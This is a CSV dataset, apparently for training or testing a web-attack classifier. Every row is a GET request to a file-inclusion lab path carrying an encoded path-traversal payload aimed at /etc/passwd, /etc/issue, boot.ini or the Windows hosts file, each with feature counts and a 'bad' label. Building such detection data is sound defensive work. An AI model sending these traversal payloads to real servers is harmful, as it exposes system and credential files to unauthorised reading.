method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=ÀîÀîÀ%qfÀîÀîÀ%qfÀîÀîÀ%qfÀîÀîÀ%qfÀîÀîÀ%qfÀîÀîÀ%qfwindowsÀ%qfsystem32À%qfdriversÀ%qfetcÀ%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^\À^À^\À^À^\À^À^\À^À^\À^À^\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%2fÀþÀþ%2fÀþÀþ%2fÀþÀþ%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.À%9vetcÀ%9vissue,,1,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=./.././.././.././.././.././.././.././../boot.ini,,8,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%uF025ü€€€€®ü€€€€®%uF025ü€€€€®ü€€€€®%uF025ü€€€€®ü€€€€®%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À®À®0x5cÀ®À®0x5cetc0x5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®Áœà€®à€®Áœà€®à€®Áœà€®à€®ÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%uEFC8ü€€€€®ü€€€€®%uEFC8ü€€€€®ü€€€€®%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc\issue,,0,5,4,2,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e\0x2e0x2e\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eÀ¯%2e%2eÀ¯%2e%2eÀ¯%2e%2eÀ¯etcÀ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîð€€¯etcð€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..Á%pc..Á%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/\../\../\../\../,,4,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..à€¯..à€¯..à€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?./?./?./?./?./?./etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/php.d/mbstring.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®/À®À®/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%c0%afð€€®ð€€®%c0%afð€€®ð€€®%c0%afð€€®ð€€®%c0%afð€€®ð€€®%c0%afetc%c0%afissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%uEFC8\..%uEFC8\..%uEFC8\..%uEFC8\..%uEFC8\..%uEFC8etc%uEFC8issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%2%f??%2%f??%2%f??%2%f??%2%fetc%2%fissue,,0,0,0,0,0,0,0,bad
